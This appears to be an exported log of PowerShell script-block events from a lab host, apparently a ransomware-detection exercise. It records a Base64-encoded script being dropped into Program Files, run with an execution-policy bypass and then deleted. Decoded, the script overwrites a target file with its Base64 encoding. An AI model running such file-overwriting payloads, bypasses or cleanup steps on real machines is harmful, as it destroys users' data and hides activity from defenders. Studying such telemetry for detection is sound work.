"_time","event.code","host.name","winlog.event_data.CommandLine","winlog.event_data.ScriptBlockText"
"2025-11-16T08:00:10.177+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null","cd ../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd ../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:00:13.805+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null","cd ../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd ../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:00:19.148+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null","ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:00:29.226+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null","cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:04:14.363+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null","@'
# decrypt.ps1
# SCRIPT GIẢI MÃ KÉP (Double Decode) cho Base64 + Unicode

param(
    # Tham số 1: Đường dẫn file mục tiêu (.encrypted)
    [Parameter(Mandatory=$false)]
    [string]$EncryptedPath,

    # Tham số 2: Chuỗi Base64 trực tiếp từ Log (Ví dụ: từ EID 4104)
    [Parameter(Mandatory=$false)]
    [string]$Base64Input
)

try {
    # Kiểm tra tính hợp lệ của tham số
    if (-not $EncryptedPath -and -not $Base64Input) {
        Write-Error ""Lỗi: Bạn phải cung cấp -EncryptedPath hoặc -Base64Input.""
        exit 1
    }
    if ($EncryptedPath -and $Base64Input) {
        Write-Error ""Lỗi: Chỉ được cung cấp một trong hai tham số.""
        exit 1
    }

    $base64Content = $null
    $outputFileName = ""decoded_output.txt"" # Đổi tên file output thành .txt
    $originalFileName = """"

    # BƯỚC 1: Xử lý đầu vào (Input Handling)
    if ($EncryptedPath) {
        Write-Host ""[*] Bắt đầu giải mã từ file: $EncryptedPath""
        
        # 1. Kiểm tra file tồn tại
        if (-not (Test-Path -Path $EncryptedPath -PathType Leaf)) {
            Write-Error ""Lỗi: Không tìm thấy file mã hóa: $EncryptedPath""
            exit 1
        }
        
        # 2. Đọc nội dung file Base64 dưới dạng chuỗi (Đầu vào)
        $base64Content = [System.IO.File]::ReadAllText($EncryptedPath)
        
        # 3. Định nghĩa tên file mới (Bỏ đi đuôi .encrypted)
        $newDecryptedPath = $EncryptedPath.Replace("".encrypted"", "".recovered.txt"")
        $outputFileName = $newDecryptedPath
        $originalFileName = $EncryptedPath

    } elseif ($Base64Input) {
        Write-Host ""[*] Bắt đầu giải mã chuỗi Base64 trực tiếp (Output: $outputFileName)""
        $base64Content = $Base64Input
        $newDecryptedPath = $outputFileName
        $originalFileName = ""Base64 Input""
    }

    # BƯỚC 2: Giải mã Base64 (Lần 1)
    $contentBytes = [System.Convert]::FromBase64String($base64Content)

    # BƯỚC 3: Decode Unicode (Lần 2) và Ghi ra file Text
    # Dùng UTF8 Encoding để khôi phục (vì script gốc dùng UTF8Encoding không BOM)
    $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
    $decodedText = $utf8NoBom.GetString($contentBytes)

    # Ghi nội dung đã decode (text) ra file mới
    [System.IO.File]::WriteAllText($newDecryptedPath, $decodedText, $utf8NoBom)

    Write-Host ""[+] Giải mã kép thành công!""
    Write-Host ""[+] File gốc đã khôi phục: $newDecryptedPath""
}
catch {
    Write-Error ""Gặp lỗi trong quá trình giải mã: $($_.Exception.Message)""
    exit 1
}
'@ | Set-Content -Path .\decrypt.ps1 -Encoding UTF8
@'
# decrypt.ps1
# SCRIPT GIẢI MÃ KÉP (Double Decode) cho Base64 + Unicode

param(
    # Tham số 1: Đường dẫn file mục tiêu (.encrypted)
    [Parameter(Mandatory=$false)]
    [string]$EncryptedPath,

    # Tham số 2: Chuỗi Base64 trực tiếp từ Log (Ví dụ: từ EID 4104)
    [Parameter(Mandatory=$false)]
    [string]$Base64Input
)

try {
    # Kiểm tra tính hợp lệ của tham số
    if (-not $EncryptedPath -and -not $Base64Input) {
        Write-Error ""Lỗi: Bạn phải cung cấp -EncryptedPath hoặc -Base64Input.""
        exit 1
    }
    if ($EncryptedPath -and $Base64Input) {
        Write-Error ""Lỗi: Chỉ được cung cấp một trong hai tham số.""
        exit 1
    }

    $base64Content = $null
    $outputFileName = ""decoded_output.txt"" # Đổi tên file output thành .txt
    $originalFileName = """"

    # BƯỚC 1: Xử lý đầu vào (Input Handling)
    if ($EncryptedPath) {
        Write-Host ""[*] Bắt đầu giải mã từ file: $EncryptedPath""
        
        # 1. Kiểm tra file tồn tại
        if (-not (Test-Path -Path $EncryptedPath -PathType Leaf)) {
            Write-Error ""Lỗi: Không tìm thấy file mã hóa: $EncryptedPath""
            exit 1
        }
        
        # 2. Đọc nội dung file Base64 dưới dạng chuỗi (Đầu vào)
        $base64Content = [System.IO.File]::ReadAllText($EncryptedPath)
        
        # 3. Định nghĩa tên file mới (Bỏ đi đuôi .encrypted)
        $newDecryptedPath = $EncryptedPath.Replace("".encrypted"", "".recovered.txt"")
        $outputFileName = $newDecryptedPath
        $originalFileName = $EncryptedPath

    } elseif ($Base64Input) {
        Write-Host ""[*] Bắt đầu giải mã chuỗi Base64 trực tiếp (Output: $outputFileName)""
        $base64Content = $Base64Input
        $newDecryptedPath = $outputFileName
        $originalFileName = ""Base64 Input""
    }

    # BƯỚC 2: Giải mã Base64 (Lần 1)
    $contentBytes = [System.Convert]::FromBase64String($base64Content)

    # BƯỚC 3: Decode Unicode (Lần 2) và Ghi ra file Text
    # Dùng UTF8 Encoding để khôi phục (vì script gốc dùng UTF8Encoding không BOM)
    $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
    $decodedText = $utf8NoBom.GetString($contentBytes)

    # Ghi nội dung đã decode (text) ra file mới
    [System.IO.File]::WriteAllText($newDecryptedPath, $decodedText, $utf8NoBom)

    Write-Host ""[+] Giải mã kép thành công!""
    Write-Host ""[+] File gốc đã khôi phục: $newDecryptedPath""
}
catch {
    Write-Error ""Gặp lỗi trong quá trình giải mã: $($_.Exception.Message)""
    exit 1
}
'@ | Set-Content -Path .\decrypt.ps1 -Encoding UTF8"
"2025-11-16T08:06:10.477+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null","ex
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
ex
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:06:12.380+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null","exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:09:21.779+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null","(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:09:26.612+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null","cd ../../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd ../../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:09:32.237+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null","ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:09:40.639+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null","cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:10:09.813+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null","$hash_file = @{
  ""08f1cb261457cc70a50d7cfd5344b43a0df54eff"" = @{
    ""target"" = ""C:\Program Files\encrypt1.ps1"";
    ""src_basename"" = ""encrypt1.ps1"";
    ""dst"" = ""C:\Program Files\encrypt1.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$hash_file = @{
  ""08f1cb261457cc70a50d7cfd5344b43a0df54eff"" = @{
    ""target"" = ""C:\Program Files\encrypt1.ps1"";
    ""src_basename"" = ""encrypt1.ps1"";
    ""dst"" = ""C:\Program Files\encrypt1.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:10:10.002+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:10:10.124+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null","            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiQzpcUHJvZ3JhbSBGaWxlc1xkYXRhX2ltcG9ydGFudC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aClzCiAgICAKICAgICMgRW5jb2RlIEJhc2U2NCAobcO0IHBo4buPbmcgJ2VuY3J5cHRpb24nKQogICAgJGJhc2U2NENvbnRlbnQgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkY29udGVudEJ5dGVzKQogICAgCiAgICAjIEdoaSDEkcOoIG7hu5lpIGR1bmcgQmFzZTY0IHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKICAgIFNldC1Db250ZW50IC1QYXRoICRQYXRoIC1WYWx1ZSAkYmFzZTY0Q29udGVudCAtRW5jb2RpbmcgVVRGOAogICAgCiAgICBXcml0ZS1Ib3N0ICJbK10gVGjDoG5oIGPDtG5nISBGaWxlIMSRw6MgYuG7iyAnbcOjIGjDs2EnIChCYXNlNjQpLiIKICAgIFdyaXRlLUhvc3QgIlsrXSBGaWxlIGhp4buHbiB04bqhaTogJFBhdGgiCgp9IGNhdGNoIHsKICAgIFdyaXRlLUVycm9yICJH4bq3cCBs4buXaTogJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCn0Kcwo=')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiQzpcUHJvZ3JhbSBGaWxlc1xkYXRhX2ltcG9ydGFudC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aClzCiAgICAKICAgICMgRW5jb2RlIEJhc2U2NCAobcO0IHBo4buPbmcgJ2VuY3J5cHRpb24nKQogICAgJGJhc2U2NENvbnRlbnQgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkY29udGVudEJ5dGVzKQogICAgCiAgICAjIEdoaSDEkcOoIG7hu5lpIGR1bmcgQmFzZTY0IHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKICAgIFNldC1Db250ZW50IC1QYXRoICRQYXRoIC1WYWx1ZSAkYmFzZTY0Q29udGVudCAtRW5jb2RpbmcgVVRGOAogICAgCiAgICBXcml0ZS1Ib3N0ICJbK10gVGjDoG5oIGPDtG5nISBGaWxlIMSRw6MgYuG7iyAnbcOjIGjDs2EnIChCYXNlNjQpLiIKICAgIFdyaXRlLUhvc3QgIlsrXSBGaWxlIGhp4buHbiB04bqhaTogJFBhdGgiCgp9IGNhdGNoIHsKICAgIFdyaXRlLUVycm9yICJH4bq3cCBs4buXaTogJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCn0Kcwo=')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:10:10.171+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null","$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:10:10.203+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null","
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:10:20.197+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null"," powershell -ExecutionPolicy Bypass -File .\encrypt1.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
 powershell -ExecutionPolicy Bypass -File .\encrypt1.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:10:52.928+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null","rm encrypt1.ps1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
rm encrypt1.ps1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:11:17.279+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null","$hash_file = @{
  ""1cdf69eb24b18a7f4ad2f036c83493ca58527518"" = @{
    ""target"" = ""C:\Program Files\encrypt1.ps1"";
    ""src_basename"" = ""encrypt1.ps1"";
    ""dst"" = ""C:\Program Files\encrypt1.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$hash_file = @{
  ""1cdf69eb24b18a7f4ad2f036c83493ca58527518"" = @{
    ""target"" = ""C:\Program Files\encrypt1.ps1"";
    ""src_basename"" = ""encrypt1.ps1"";
    ""dst"" = ""C:\Program Files\encrypt1.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:11:17.393+0000","4104
4104","DESKTOP-00OJS0K
DESKTOP-00OJS0K","null
null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
